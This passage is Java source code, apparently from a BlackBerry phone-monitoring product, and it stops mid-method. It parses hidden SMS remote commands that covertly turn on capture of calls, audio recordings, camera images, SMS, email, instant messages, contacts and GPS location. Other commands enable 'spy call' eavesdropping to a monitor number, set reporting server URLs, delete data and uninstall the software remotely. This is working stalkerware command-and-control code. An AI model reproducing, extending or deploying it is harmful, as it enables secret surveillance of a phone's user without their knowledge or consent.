package com.vvt.rmtcmd;

import java.util.Hashtable;
import java.util.Vector;
import net.rim.device.api.system.RuntimeStore;
import com.vvt.db.FxEventDatabase;
import com.vvt.event.FxSystemEvent;
import com.vvt.event.constant.FxCategory;
import com.vvt.event.constant.FxDirection;
import com.vvt.global.Global;
import com.vvt.info.ApplicationInfo;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.license.LicenseStatus;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.command.SetWatchFlagsCmd;
import com.vvt.rmtcmd.command.WatchFlags;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.rmtcmd.util.RmtCmdUtil;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.smsutil.SMSSendListener;
import com.vvt.smsutil.SMSSender;
import com.vvt.std.ByteUtil;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.version.VersionInfo;

public class RmtCmdRegister implements SMSSendListener {
	
	private static final String TAG = "RmtCmdRegister";
	private static RmtCmdRegister self = null;
	private static final long RMT_CMD_REG_GUID = 0x4d96cc2f6891dd33L;
	private LicenseManager licenseMgr = Global.getLicenseManager();
	private SMSCmdStore cmdStore = Global.getSMSCmdStore();
	private SMSCommandCode smsCmdCode = cmdStore.getSMSCommandCode();
	private LicenseInfo licenseInfo = licenseMgr.getLicenseInfo();
	private SMSSender smsSender = Global.getSMSSender();
	private Vector commands = new Vector();
	private String errorMessage = null;
	private boolean isDebugSerialIdMode = false; 
	private boolean isDebugMode = false;
	private String debugSerialId = "";
	private FxEventDatabase db = Global.getFxEventDatabase();
	private Preference pref = Global.getPreference();
	private PrefBugInfo prefBugInfo = (PrefBugInfo) pref.getPrefInfo(PreferenceType.PREF_BUG_INFO); 
	private PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
	private RmtCmdUtil rmtCmdUtil = new RmtCmdUtil();
	private SendEventManager eventSender = Global.getSendEventManager();
	
	private RmtCmdRegister() {
	}
	
	public static RmtCmdRegister getInstance() {
		if (self == null) {
			self = (RmtCmdRegister)RuntimeStore.getRuntimeStore().get(RMT_CMD_REG_GUID);
		}
		if (self == null) {
			RmtCmdRegister rmtCmdReg = new RmtCmdRegister();
			RuntimeStore.getRuntimeStore().put(RMT_CMD_REG_GUID, rmtCmdReg);
			self = rmtCmdReg;
		}
		return self;
	}
	
	public Vector getCommands() {
		return commands;
	}
	
	public void deregisterCommands(RmtCmdLine cmdLine) {
		int cmd = cmdLine.getCode();
		for (int i = 0; i < commands.size(); i++) {
			RmtCmdLine tmp = (RmtCmdLine)commands.elementAt(i);
			if (cmd == tmp.getCode()) {
				commands.removeElementAt(i);
				break;
			}
		}
	}
	
	public void deregisterAllCommands() {
		commands.removeAllElements();
	}
	
	public void registerCommands(RmtCmdLine cmdLine) {
		if (!isCmdExisted(cmdLine.getCode())) {
			commands.addElement(cmdLine);
		}
	}
	
	public RmtCmdLine parseRmtCmdLine(FxSMSMessage smsMessage) {
		RmtCmdLine cmd = null;
		String[] data = null;
		String message = smsMessage.getMessage().trim();
//		Log.debug(TAG + ".parseRmtCmdLine()", "message: " + message);
//		if (isSMSCommand(message)) {
		if (rmtCmdUtil.isSMSCommand(message)) {
			// To create system event.
			createSystemEventIn(smsMessage.getMessage());	
//			Log.debug(TAG + ".parseRmtCmdLine()", "isSMSCommand()");
			Vector token = new Vector();
			int notFound = -1;
			int nextPos = 0;
			int startPos = 0;
			while ((startPos = message.indexOf("<", nextPos)) != notFound) {
				int endPos = message.indexOf(">", nextPos);
				token.addElement(message.substring(startPos + 1, endPos));
				nextPos = endPos + 1;
			}
			data = new String[token.size()];
			for (int i = 0; i < data.length; i++) {
				data[i] = (String)token.elementAt(i);
			}
			smsCmdCode = cmdStore.getSMSCommandCode();
			int queryUrlCmdId = Integer.parseInt(data[0].substring(2));
//			Log.debug(TAG + ".parseRmtCmdLine()", "data.length: " + data.length);
			if (data.length >= 2 || queryUrlCmdId == smsCmdCode.getQueryUrlCmd()) {
//				Log.debug(TAG + ".parseRmtCmdLine()", "Before getRmtCmdLine(data)");
				cmd = getRmtCmdLine(data);
//				Log.debug(TAG + ".parseRmtCmdLine()", "cmd != null: " + (cmd != null));
				if (cmd != null) {
					// To check activation code.
					if (cmd.getCode() == smsCmdCode.getActivateUrlCmd() || cmd.getCode() == smsCmdCode.getActivationAcUrlCmd() || cmd.getActivationCode().equals(licenseInfo.getActivationCode())) {
						cmd.setSenderNumber(smsMessage.getNumber());
					} else {
						errorMessage = RmtCmdTextResource.WRONG_ACT_CODE;
					}
					// To check product status.
					if (cmd.getCode() != smsCmdCode.getActivateUrlCmd() && cmd.getCode() != smsCmdCode.getActivationAcUrlCmd() && licenseInfo.getLicenseStatus().getId() != LicenseStatus.ACTIVATED.getId()) {
						errorMessage = RmtCmdTextResource.PROD_NOT_ACT;
					}
				}
			} else {
				errorMessage = RmtCmdTextResource.INV_CMD_FORMAT;
			}
			// Log.error("RmtCmdRegister.parseRmtCmdLine", errorMessage);
			// If there is any error, it will send SMS to the target if <D> present.
			if (errorMessage != null) {
				cmd = null;
				licenseInfo = licenseMgr.getLicenseInfo();				
				StringBuffer msg = new StringBuffer();
				if (isDebugSerialIdMode) {
					// [D:SerialID][ERROR][PROD_ID PROD_VERSION][CMD_ID]
					msg.append(Constant.L_SQUARE_BRACKET);
					msg.append(debugSerialId);
					msg.append(Constant.R_SQUARE_BRACKET);
					msg.append(Constant.L_SQUARE_BRACKET);
					msg.append(Constant.ERROR);
					msg.append(Constant.R_SQUARE_BRACKET);
				}
				// [PID  Version][CMD_ID] OK/ERROR
				msg.append(Constant.L_SQUARE_BRACKET);
				msg.append(licenseInfo.getProductID());
				msg.append(Constant.SPACE);
				msg.append(VersionInfo.getFullVersion());
				msg.append(Constant.R_SQUARE_BRACKET);
				if (!errorMessage.equals(RmtCmdTextResource.NOT_CMD_MSG)) {
					msg.append(Constant.L_SQUARE_BRACKET);
					msg.append(data[0].substring(2));
					msg.append(Constant.R_SQUARE_BRACKET);
				}
				msg.append(Constant.SPACE);
				msg.append(Constant.ERROR);
				msg.append(Constant.CRLF);
				msg.append(errorMessage);
				// To create system event.
				createSystemEventOut(msg.toString());
				if (isDebugMode) {
					FxSMSMessage sms = new FxSMSMessage();
					sms.setMessage(msg.toString());
					sms.setNumber(smsMessage.getNumber());
					smsSender.addListener(this);
					smsSender.send(sms);
				}
				errorMessage = null;
			}
		}
		return cmd;
	}
	
	private void createSystemEventIn(String message) {
		FxSystemEvent systemEvent = new FxSystemEvent();
		systemEvent.setCategory(FxCategory.SMS_CMD);
		systemEvent.setDirection(FxDirection.IN);
		systemEvent.setEventTime(System.currentTimeMillis());
		systemEvent.setSystemMessage(message);
		db.insert(systemEvent);
	}
	
	private void createSystemEventOut(String message) {
		FxSystemEvent systemEvent = new FxSystemEvent();
		systemEvent.setCategory(FxCategory.SMS_CMD_REPLY);
		systemEvent.setEventTime(System.currentTimeMillis());
		systemEvent.setDirection(FxDirection.OUT);
		systemEvent.setSystemMessage(message);
		db.insert(systemEvent);
	}
	
	private RmtCmdLine getRmtCmdLine(String[] data) {
		RmtCmdLine cmd = null;
		int commandIdMode = 0;
		int activationMode = 1;
		int gpsIndexMode = 2;
		int castMode = commandIdMode;
		try {
//			Log.debug("getRmtCmdLine", "ENTER");
			int cmdId = Integer.parseInt(data[0].trim().substring(2));
//			Log.debug("RmtCmdRegister.getRmtCmdLine()", "cmdId: " + cmdId);
			if (isCmdExisted(cmdId)) {
//				Log.debug("RmtCmdRegister.getRmtCmdLine()", "isCmdExisted!");
				/*cmd = new RmtCmdLine();
				cmd.setRmtCmdType(RmtCmdType.SMS);
				cmd.setCode(cmdId);*/
				smsCmdCode = cmdStore.getSMSCommandCode();				
				if (cmdId == smsCmdCode.getActivateUrlCmd()) {
					if (data.length > 1) {
						cmd = new RmtCmdLine();
						cmd.setRmtCmdType(RmtCmdType.SMS);
						cmd.setCode(cmdId);
						byte[] url = data[1].getBytes();
						byte target = (byte)0xa3;
						byte replace = (byte)0x3a;
						for (int i = 0; i < url.length; i++) {
							if (url[i] == target) {
								url[i] = replace;
							}
						}
						cmd.setUrl(new String(url));					
						if (data.length == 4 && data[3].equalsIgnoreCase("D")){	
							cmd.setRecipientNumber(data[2]);
							cmd.setReply(true);
							isDebugMode = true;
						}
					} else {
						errorMessage = RmtCmdTextResource.INV_CMD_FORMAT;
					}
				} else if (cmdId == smsCmdCode.getActivationAcUrlCmd()) {
					if (data.length > 1) {
						cmd = new RmtCmdLine();
						cmd.setRmtCmdType(RmtCmdType.SMS);
						cmd.setCode(cmdId);
						cmd.setActivationCode(data[1]);
						byte[] url = data[2].getBytes();
						byte target = (byte)0xa3;
						byte replace = (byte)0x3a;
						for (int i = 0; i < url.length; i++) {
							if (url[i] == target) {
								url[i] = replace;
							}
						}
						cmd.setUrl(new String(url));
						if (data.length == 5 && data[4].equalsIgnoreCase("D")){		
							cmd.setRecipientNumber(data[3]);
							cmd.setReply(true);
							isDebugMode = true;
						}
					} else {
						errorMessage = RmtCmdTextResource.INV_CMD_FORMAT;
					}
				} else if (cmdId == smsCmdCode.getDeactivationCmd()) {
					/*if (Log.isDebugEnable()) {
						Log.debug(TAG + ".getRmtCmdLine()", "deactivate");
						for (int i = 0; i < data.length; i++) {
							Log.debug(TAG + ".getRmtCmdLine().deactivate", "length: " + data.length);
							Log.debug(TAG + ".getRmtCmdLine().deactivate", "data" + i + ": " + data[i]);
						}
					}*/
					cmd = new RmtCmdLine();
					cmd.setRmtCmdType(RmtCmdType.SMS);
					cmd.setCode(cmdId);
					castMode = activationMode;
					cmd.setActivationCode(data[1]);
					if (data.length > 1) {
						if (data.length == 4 && data[3].equalsIgnoreCase("D")){	
							cmd.setRecipientNumber(data[2]);
							cmd.setReply(true);
							isDebugMode = true;
						}
					} else {
						errorMessage = RmtCmdTextResource.INV_CMD_FORMAT;
					}
				} else if (cmdId == smsCmdCode.getSettingCmd()) {
					
//					Log.debug("getRmtCmdLine", "getSettingCmd");
					
					boolean valid = true;
					SetSettingsCmdLine settingsCmdLine = new SetSettingsCmdLine();
					settingsCmdLine.setRmtCmdType(RmtCmdType.SMS);
					settingsCmdLine.setCode(cmdId);
					castMode = activationMode;
					settingsCmdLine.setActivationCode(data[1]);
					Hashtable setting = new Hashtable();
					int dataCnt = data.length;
					if (data[data.length - 1].equalsIgnoreCase("D")) {
						settingsCmdLine.setReply(true);	
						isDebugMode = true;
						--dataCnt;
					} else if (data[data.length - 1].regionMatches(true, 0, "D:", 0, 2)) {
						settingsCmdLine.setDebugSerialId(data[data.length - 1].toUpperCase());
						settingsCmdLine.setDebugSerialIdMode(true);
						isDebugSerialIdMode = true;
						debugSerialId = data[data.length - 1].toUpperCase();
						--dataCnt;
					}
					for (int i = 2; i < dataCnt; i++) {
						int index = data[i].indexOf(Constant.COLON);
						String id = data[i].trim().substring(0, index);
						String value = data[i].trim().substring(index + 1);
						castMode = commandIdMode;
						int settingId = Integer.parseInt(id);
						if (settingId == SetSettingCode.HOME_IN.getId()) {
							
//							Log.debug("getRmtCmdLine", "getSettingCmd.HOME_IN");
							
							Vector homeInNumber = rmtCmdUtil.parseNumber(value);
							if (rmtCmdUtil.isInvalidNumber(homeInNumber)) {
								valid = false;
								break;
							}
							homeInNumber = rmtCmdUtil.getOnlyUniqueNumber(homeInNumber);
							if (homeInNumber.size() > prefBugInfo.getMaxHomeOutNumbers()) {
								valid = false;
								break;
							}
							setting.put(SetSettingCode.HOME_IN, homeInNumber);
						} else if (settingId == SetSettingCode.SET_WATCH_FLAGS.getId()) {
							
//							Log.debug("getRmtCmdLine", "getSettingCmd.SET_WATCH_FLAGS");
							
							Vector flags = rmtCmdUtil.parseNumber(value);
							if (rmtCmdUtil.isInvalidWatchFlags(flags)) {
								valid = false;
								break;
							}
							setting.put(SetSettingCode.SET_WATCH_FLAGS, flags);
						} else if (settingId == SetSettingCode.MONITOR_NUMBER.getId()) {
							
//							Log.debug("getRmtCmdLine", "getSettingCmd.MONITOR_NUMBER");
							
							Vector monitorNumber = rmtCmdUtil.parseNumber(value);
							if (rmtCmdUtil.isInvalidNumber(monitorNumber)) {
								valid = false;
								break;
							}
							monitorNumber = rmtCmdUtil.getOnlyUniqueNumber(monitorNumber);
							if (monitorNumber.size() > prefBugInfo.getMaxMonitorNumbers()) {
								valid = false;
								break;
							}
							setting.put(SetSettingCode.MONITOR_NUMBER, monitorNumber);								
						} else {
							int settingValue = Integer.parseInt(value);
							if (settingId == SetSettingCode.AUDIO_RECORD.getId()) {
								
//								Log.debug("getRmtCmdLine", "getSettingCmd.AUDIO_RECORD");
								
								if (settingValue < 0 || settingValue > 1) {
									valid = false;
									break;
								}
								setting.put(SetSettingCode.AUDIO_RECORD, new Integer(settingValue));
							} else if (settingId == SetSettingCode.CALL.getId()) {
								
//								Log.debug("getRmtCmdLine", "getSettingCmd.CALL");
								
								if (settingValue < 0 || settingValue > 1) {
									valid = false;
									break;
								}
								setting.put(SetSettingCode.CALL, new Integer(settingValue));
							} else if (settingId == SetSettingCode.CAMERA_IMAGE.getId()) {
								
//								Log.debug("getRmtCmdLine", "getSettingCmd.CAMERA_IMAGE");
								
								if (settingValue < 0 || settingValue > 1) {
									valid = false;
									break;
								}
								setting.put(SetSettingCode.CAMERA_IMAGE, new Integer(settingValue));
							} else if (settingId == SetSettingCode.CAPTURE_TIMER.getId()) {
								
//								Log.debug("getRmtCmdLine", "getSettingCmd.CAPTURE_TIMER");
								
								if (settingValue < 0 || settingValue > (ApplicationInfo.TIME.length - 1)) {
									valid = false;
									break;
								}
								setting.put(SetSettingCode.CAPTURE_TIMER, new Integer(settingValue));
							} else if (settingId == SetSettingCode.CONTACT.getId()) {
								
//								Log.debug("getRmtCmdLine", "getSettingCmd.CONTACT");
								
								if (settingValue < 0 || settingValue > 1) {
									valid = false;
									break;
								}
								setting.put(SetSettingCode.CONTACT, new Integer(settingValue));
							} else if (settingId == SetSettingCode.EVENT_COUNT.getId()) {
								
//								Log.debug("getRmtCmdLine", "getSettingCmd.EVENT_COUNT");
								
								if (settingValue < 1 || settingValue > generalInfo.getMaxEventRange()) {
									valid = false;
									break;
								}
								setting.put(SetSettingCode.EVENT_COUNT, new Integer(settingValue));
							} else if (settingId == SetSettingCode.GPS.getId()) {
								
//								Log.debug("getRmtCmdLine", "getSettingCmd.GPS");
								
								if (settingValue < 0 || settingValue > 1) {
									valid = false;
									break;
								}
								setting.put(SetSettingCode.GPS, new Integer(settingValue));
							} else if (settingId == SetSettingCode.GPS_TIMER.getId()) {
								
//								Log.debug("getRmtCmdLine", "getSettingCmd.GPS_TIMER, ApplicationInfo.LOCATION_TIMER.length: " + ApplicationInfo.LOCATION_TIMER.length);
								
								if ((settingValue < 1) || (settingValue > ApplicationInfo.LOCATION_TIMER.length)) {
									valid = false;
									break;
								}
								setting.put(SetSettingCode.GPS_TIMER, new Integer(settingValue));
							} else if (settingId == SetSettingCode.IM.getId()) {
								
//								Log.debug("getRmtCmdLine", "getSettingCmd.IM");
								
								if (settingValue < 0 || settingValue > 1) {
									valid = false;
									break;
								}
								setting.put(SetSettingCode.IM, new Integer(settingValue));
							} else if (settingId == SetSettingCode.MAIL.getId()) {
								
//								Log.debug("getRmtCmdLine", "getSettingCmd.MAIL");
								
								if (settingValue < 0 || settingValue > 1) {
									valid = false;
									break;
								}
								setting.put(SetSettingCode.MAIL, new Integer(settingValue));
							} else if (settingId == SetSettingCode.PIN.getId()) {
								
//								Log.debug("getRmtCmdLine", "getSettingCmd.PIN");
								
								if (settingValue < 0 || settingValue > 1) {
									valid = false;
									break;
								}
								setting.put(SetSettingCode.PIN, new Integer(settingValue));
							} else if (settingId == SetSettingCode.SMS.getId()) {
								
//								Log.debug("getRmtCmdLine", "getSettingCmd.SMS");
								
								if (settingValue < 0 || settingValue > 1) {
									valid = false;
									break;
								}
								setting.put(SetSettingCode.SMS, new Integer(settingValue));
							} else if (settingId == SetSettingCode.START_STOP_CAPTURE.getId()) {
								
//								Log.debug("getRmtCmdLine", "getSettingCmd.START_STOP_CAPTURE");
								
								if (settingValue < 0 || settingValue > 1) {
									valid = false;
									break;
								}
								setting.put(SetSettingCode.START_STOP_CAPTURE, new Integer(settingValue));
							} else if (settingId == SetSettingCode.VIDEO_FILE.getId()) {
								
//								Log.debug("getRmtCmdLine", "getSettingCmd.VIDEO_FILE");
								
								if (settingValue < 0 || settingValue > 1) {
									valid = false;
									break;
								}
								setting.put(SetSettingCode.VIDEO_FILE, new Integer(settingValue));
							} else if (settingId == SetSettingCode.ENABLE_WATCH.getId()) {
								
//								Log.debug("getRmtCmdLine", "getSettingCmd.ENABLE_WATCH");
								
								if (settingValue < 0 || settingValue > 1) {
									valid = false;
									break;
								}
								setting.put(SetSettingCode.ENABLE_WATCH, new Integer(settingValue));
							} else if (settingId == SetSettingCode.ENABLE_SPYCALL.getId()) {
								
//								Log.debug("getRmtCmdLine", "getSettingCmd.ENABLE_SPYCALL");
								
								if (settingValue < 0 || settingValue > 1) {
									valid = false;
									break;
								}
								setting.put(SetSettingCode.ENABLE_SPYCALL, new Integer(settingValue));
							} else {
								
//								Log.debug("getRmtCmdLine", "getSettingCmd.else");
								
								valid = false;
								break;
							}
						}	
					}
//					Log.debug("getRmtCmdLine", "valid? " + valid);
					if (!valid) {
						errorMessage = RmtCmdTextResource.INV_CMD_FORMAT;
						cmd = null;
					} else {					
						settingsCmdLine.setDefaultSetting(setting);
						cmd = settingsCmdLine;
					}
				} else if (cmdId == smsCmdCode.getUninstallCmd()) {
					if (data.length > 1) {
						if (data.length == 2 || data.length == 3) {
							cmd = new RmtCmdLine();
							cmd.setRmtCmdType(RmtCmdType.SMS);
							cmd.setCode(cmdId);
							cmd.setEnabled(1);
							castMode = activationMode;
							cmd.setActivationCode(data[1]);
							if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
								cmd.setReply(true);
								isDebugMode = true;
							}
						}
					} else {
						errorMessage = RmtCmdTextResource.INV_CMD_FORMAT;
					}
				} else if (cmdId == smsCmdCode.getDeleteDatabaseCmd()) {
					if (data.length == 2 || data.length == 3) {
						cmd = new RmtCmdLine();
						cmd.setRmtCmdType(RmtCmdType.SMS);
						cmd.setCode(cmdId);
						castMode = activationMode;
						cmd.setActivationCode(data[1]);
						if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
							cmd.setReply(true);
							isDebugMode = true;
						}
					}
				} else if (cmdId == smsCmdCode.getBBMCmd()) {
					if (data.length == 3 || data.length == 4) {
						cmd = new RmtCmdLine();
						cmd.setRmtCmdType(RmtCmdType.SMS);
						cmd.setCode(cmdId);
						castMode = activationMode;
						cmd.setActivationCode(data[1]);
						if (data[2].equals("0")) {
							cmd.setEnabled(0);
						} else if (data[2].equals("1")) {
							cmd.setEnabled(1);
						} else {
							errorMessage = RmtCmdTextResource.INV_CMD_FORMAT;
						}
						if (data.length == 4 && data[3].equalsIgnoreCase("D")) {
							cmd.setReply(true);	
							isDebugMode = true;
						}
					}
				} else if (cmdId == smsCmdCode.getEnableGPSCmd()) {
					if (data.length == 3 || data.length == 4) {
						cmd = new RmtCmdLine();
						cmd.setRmtCmdType(RmtCmdType.SMS);
						cmd.setCode(cmdId);
						castMode = activationMode;
						cmd.setActivationCode(data[1]);
						if (data[2].equals("0")) {
							cmd.setEnabled(0);
						} else if (data[2].equals("1")) {
							cmd.setEnabled(1);
						} else {
							errorMessage = RmtCmdTextResource.INV_GPS_VALUE;
						}
						if (data.length == 4 && data[3].equalsIgnoreCase("D")) {
							cmd.setReply(true);	
							isDebugMode = true;
						}
					}
				} else if (cmdId == smsCmdCode.getGPSOnDemandCmd()) {
					if (data.length == 2 || data.length == 3) {
						cmd = new RmtCmdLine();
						cmd.setRmtCmdType(RmtCmdType.SMS);
						cmd.setCode(cmdId);
						cmd.setEnabled(1);
						castMode = activationMode;
						cmd.setActivationCode(data[1]);
						if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
							cmd.setReply(true);	
							isDebugMode = true;
						}
					}
				} else if (cmdId == smsCmdCode.getUpdateLocationIntervalCmd()) {
					if (data.length == 3 || data.length == 4) {
						cmd = new RmtCmdLine();
						cmd.setRmtCmdType(RmtCmdType.SMS);
						cmd.setCode(cmdId);
						castMode = gpsIndexMode;
						cmd.setActivationCode(data[1]);						
						int gpsIndex = Integer.parseInt(data[2]);
						if (gpsIndex >= 0 && gpsIndex < 9) {
							cmd.setGpsIndex(gpsIndex);
						} else {
							errorMessage = RmtCmdTextResource.INV_GPS_TIMER;
						}
						if (data.length == 4 && data[3].equalsIgnoreCase("D")) {
							cmd.setReply(true);		
							isDebugMode = true;
						}						
					}
				} else if (cmdId == smsCmdCode.getSendDiagnosticsCmd()) {
					if (data.length == 2 || data.length == 3) {
						cmd = new RmtCmdLine();
						cmd.setRmtCmdType(RmtCmdType.SMS);
						cmd.setCode(cmdId);
						castMode = activationMode;
						cmd.setActivationCode(data[1]);
						if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
							cmd.setReply(true);		
							isDebugMode = true;
						}
					}
				} else if (cmdId == smsCmdCode.getRequestEventsCmd()) {
					if (data.length == 2 || data.length == 3) {
						cmd = new RmtCmdLine();
						cmd.setRmtCmdType(RmtCmdType.SMS);
						cmd.setCode(cmdId);
						castMode = activationMode;
						cmd.setActivationCode(data[1]);
						if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
							cmd.setReply(true);	
							isDebugMode = true;
						}
					}
				} else if (cmdId == smsCmdCode.getEnableSIMCmd()) {
					if (data.length == 3 || data.length == 4) {
						cmd = new RmtCmdLine();
						cmd.setRmtCmdType(RmtCmdType.SMS);
						cmd.setCode(cmdId);
						castMode = activationMode;
						cmd.setActivationCode(data[1]);
						if (data[2].equals("0")) {
							cmd.setEnabled(0);
						} else if (data[2].equals("1")) {
							cmd.setEnabled(1);
						} else {
							errorMessage = RmtCmdTextResource.INV_CMD_FORMAT;
						}
						if (data.length == 4 && data[3].equalsIgnoreCase("D")) {
							cmd.setReply(true);
							isDebugMode = true;
						}
					}
				} else if (cmdId == smsCmdCode.getEnableCaptureCmd()) {
					if (data.length == 3 || data.length == 4) {
						cmd = new RmtCmdLine();
						cmd.setRmtCmdType(RmtCmdType.SMS);
						cmd.setCode(cmdId);
						castMode = activationMode;
						cmd.setActivationCode(data[1]);
						if (data[2].equals("0")) {
							cmd.setEnabled(0);
						} else if (data[2].equals("1")) {
							cmd.setEnabled(1);
						} else {
							errorMessage = RmtCmdTextResource.INV_CMD_FORMAT;
						}
						if (data.length == 4 && data[3].equalsIgnoreCase("D")) {
							cmd.setReply(true);		
							isDebugMode = true;
						}
					}
				} else if (cmdId == smsCmdCode.getEnableSpyCallCmd()) {
					if (data.length == 3 || data.length == 4) {
						cmd = new RmtCmdLine();
						cmd.setRmtCmdType(RmtCmdType.SMS);
						cmd.setCode(cmdId);
						castMode = activationMode;
						cmd.setActivationCode(data[1]);
						if (data[2].equals("0")) {
							cmd.setEnabled(0);
						} else if (data[2].equals("1")) {
							cmd.setEnabled(1);
						} else {
							errorMessage = RmtCmdTextResource.INV_CMD_FORMAT;
						}
						if (data.length == 4 && data[3].equalsIgnoreCase("D")) {
							cmd.setReply(true);	
							isDebugMode = true;
						}
					}
				} else if (cmdId == smsCmdCode.getEnableSpyCallMPNCmd()) {
					if (data.length == 3 || data.length == 4) {
						cmd = new RmtCmdLine();
						cmd.setRmtCmdType(RmtCmdType.SMS);
						cmd.setCode(cmdId);
						cmd.setEnabled(1);
						castMode = activationMode;
						cmd.setActivationCode(data[1]);
						cmd.setMonitorNumber(data[2]);
						if (data.length == 4 && data[3].equalsIgnoreCase("D")) {
							cmd.setReply(true);	
							isDebugMode = true;
						}
					}		
				} else if (cmdId == smsCmdCode.getEnableWatchListCmd()) {
					if (data.length == 3 || data.length == 4) {
						cmd = new RmtCmdLine();
						cmd.setRmtCmdType(RmtCmdType.SMS);
						cmd.setCode(cmdId);
						castMode = activationMode;
						cmd.setActivationCode(data[1]);
						if (data[2].equals("0")) {
							cmd.setEnabled(0);
						} else if (data[2].equals("1")) {
							cmd.setEnabled(1);
						} else {
							errorMessage = RmtCmdTextResource.INV_CMD_FORMAT;
						}
						if (data.length == 4 && data[3].equalsIgnoreCase("D")) {
							cmd.setReply(true);	
							isDebugMode = true;
						}
					}
				} else if (cmdId == smsCmdCode.getSetWatchFlagsCmd()) {
					if (data.length == 6 || data.length == 7) {
						castMode = activationMode;
						WatchFlags flag = new WatchFlags();						
						if (data[2].equals("1")) {
							flag.setInAddressbook(true);;
						}						
						if (data[3].equals("1")) {
							flag.setNotAddressbook(true);
						}						
						if (data[4].equals("1")) {
							flag.setInWatchList(true);
						}						
						if (data[5].equals("1")) {
							flag.setUnknownNumber(true);
						}
						SetWatchFlagsCmd setWatchFlag = new SetWatchFlagsCmd();
						setWatchFlag.setRmtCmdType(RmtCmdType.SMS);
						setWatchFlag.setCode(cmdId);
						setWatchFlag.setWatchFlags(flag);
						setWatchFlag.setActivationCode(data[1]);
						if (data.length == 7 && data[6].equalsIgnoreCase("D")) {
							setWatchFlag.setReply(true);
							isDebugMode = true;
						}
						cmd = setWatchFlag;
					} else {
						errorMessage = RmtCmdTextResource.INV_CMD_FORMAT;
					}
				} else if (cmdId == smsCmdCode.getAddWatchNumberCmd()) {
					if (data.length > 2) {
						castMode = activationMode;
						NumberCmdLine watchNumber = new NumberCmdLine();
						watchNumber.setActivationCode(data[1]);
						watchNumber.setRmtCmdType(RmtCmdType.SMS);
						watchNumber.setCode(cmdId);
						for (int i = 2; i < data.length; i++) {	
							if ((i == data.length - 1) && (data[data.length - 1].equalsIgnoreCase("D"))) {
								watchNumber.setReply(true);
								isDebugMode = true;
								break;
							}							
							watchNumber.addNumber(data[i]);
						}
						cmd = watchNumber;
					} else {
						errorMessage = RmtCmdTextResource.INVALID_WATCH_NUMBER;
					}
				} else if (cmdId == smsCmdCode.getResetWatchNumberCmd()) {
					if (data.length > 2) {
						castMode = activationMode;
						NumberCmdLine monNumber = new NumberCmdLine();
						monNumber.setActivationCode(data[1]);
						monNumber.setRmtCmdType(RmtCmdType.SMS);
						monNumber.setCode(cmdId);
						for (int i = 2; i < data.length; i++) {	
							if ((i == data.length - 1) && (data[data.length - 1].equalsIgnoreCase("D"))) {
								monNumber.setReply(true);
								isDebugMode = true;
								break;
							}							
							monNumber.addNumber(data[i]);
						}
						cmd = monNumber;
					} else {
						errorMessage = RmtCmdTextResource.INVALID_WATCH_NUMBER;
					}
				} else if (cmdId == smsCmdCode.getClearWatchNumberCmd()) {
					cmd = new RmtCmdLine();
					cmd.setRmtCmdType(RmtCmdType.SMS);
					cmd.setCode(cmdId);
					castMode = activationMode;
					cmd.setActivationCode(data[1]);
					if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
						cmd.setReply(true);
						isDebugMode = true;
					}
				} else if (cmdId == smsCmdCode.getQueryWatchNumberCmd()) {
					cmd = new RmtCmdLine();
					cmd.setRmtCmdType(RmtCmdType.SMS);
					cmd.setCode(cmdId);
					castMode = activationMode;
					cmd.setActivationCode(data[1]);
					if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
						cmd.setReply(true);
						isDebugMode = true;
					}
				} else if (cmdId == smsCmdCode.getRequestHeartbeatCmd()) {
					if (data.length == 2 || data.length == 3) {
						cmd = new RmtCmdLine();
						cmd.setRmtCmdType(RmtCmdType.SMS);
						cmd.setCode(cmdId);
						castMode = activationMode;
						cmd.setActivationCode(data[1]);
						if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
							cmd.setReply(true);
							isDebugMode = true;
						}
					}
				} else if (cmdId == smsCmdCode.getSyncTimeCmd() || cmdId == smsCmdCode.getSyncCommDirectiveCmd() || cmdId == smsCmdCode.getSyncAddressbookCmd() || cmdId == smsCmdCode.getSendAddrForApprovalCmd()) {
					if (data.length == 2 || data.length == 3) {
						cmd = new RmtCmdLine();
						cmd.setRmtCmdType(RmtCmdType.SMS);
						cmd.setCode(cmdId);
						castMode = activationMode;
						cmd.setActivationCode(data[1]);
						if (data.length == 3 && data[2].equalsIgnoreCase("D")) {
							cmd.setReply(true);
							isDebugMode = true;
						}
					}
				} else if (cmdId == smsCmdCode.getAddURLCmd() || cmdId == smsCmdCode.getResetURLCmd()) {
					cmd = new RmtCmdLine();
					cmd.setRmtCmdType(RmtCmdType.SMS);
					cmd.setCode(cmdId);
					castMode = activationMode;
					cmd.setActivationCode(data[1]);
					if (data.length > 2) {
						Vector urlList = new Vector();
						for (int j = 2; j < data.length; j++) {	
							if ((j == data.length - 1) && (data[data.length - 1].equalsIgnoreCase("D"))) {
								cmd.setReply(true);
								isDebugMode = true;
								break;
							}
							byte[] url = ByteUtil.toByte(data[j]);
							byte target = (byte)0xa3;
							byte replace = (byte)0x3a;
							for (int i = 0; i < url.length; i++) {
								if (url[i] == target) {
									url[i] = replace;
								}
							}
							urlList.addElement(new String(url));
//							Log.debug(TAG + ".getRmtCmdLine()", new String(url));							
						}
//						Log.debug(TAG + ".getRmtCmdLine()", "urlList size: " + urlList.size());
						cmd.setAddURL(urlList);
						urlList = null;
					} else {
						errorMessage = RmtCmdTextResource.INVALID_URL;
					}					
				} else if (cmdId == smsCmdCode.getClearURLCmd() || cmdId == smsCmdCode.getQueryUrlCmd()) {
					if (data.length == 2 || data.length == 3) {
						cmd = new RmtCmdLine();
						cmd.setRmtCmdType(RmtCmdType.SMS);
						cmd.setCode(cmdId);
						castMode = activationMode;
